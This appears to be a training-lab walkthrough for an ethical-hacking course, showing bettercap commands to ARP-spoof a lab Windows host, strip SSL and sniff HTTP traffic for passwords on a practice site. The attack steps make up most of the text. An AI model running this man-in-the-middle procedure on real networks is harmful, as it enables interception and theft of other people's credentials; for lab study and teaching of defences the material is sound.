### Task 2: Intercept HTTP Traffic using bettercap

1. **Log in to Parrot Security Machine:**
   - Log in using the password `toor`.

2. **Open Terminal and Gain Root Access:**
   - Open the MATE Terminal and type:
     ```bash
     sudo su
     ```
   - Enter the password `toor`.

3. **Set Up bettercap:**
   - Start bettercap with:
     ```bash
     bettercap -iface eth0
     ```
   - Enable network probing and reconnaissance:
     ```bash
     net.probe on
     net.recon on
     ```

4. **Configure bettercap for MITM:**
   - Enable SSL stripping:
     ```bash
     set http.proxy.sslstrip true
     ```
   - Set ARP spoofing for the target:
     ```bash
     set arp.spoof.targets 10.10.1.11
     ```
   - Start the HTTP proxy and ARP spoofing:
     ```bash
     http.proxy on
     arp.spoof on
     ```

5. **Sniff Network Traffic:**
   - Start sniffing network packets:
     ```bash
     net.sniff on
     ```
   - Filter for credentials:
     ```bash
     set net.sniff.regexp '.*password=.+'
     ```

6. **Capture Credentials:**
   - On the Windows 11 machine, open Firefox and navigate to `http://www.moviescope.com`.
   - Log in with any credentials (e.g., `sam/test`).
   - Return to the Parrot Security machine to view captured credentials.

7. **Terminate bettercap:**
   - Press `Ctrl+C` to stop bettercap and confirm the termination.

### Conclusion
This lab demonstrated how to perform session hijacking using ZAP and bettercap, highlighting the importance of understanding these techniques for ethical hacking and penetration testing. Document all acquired information for further analysis.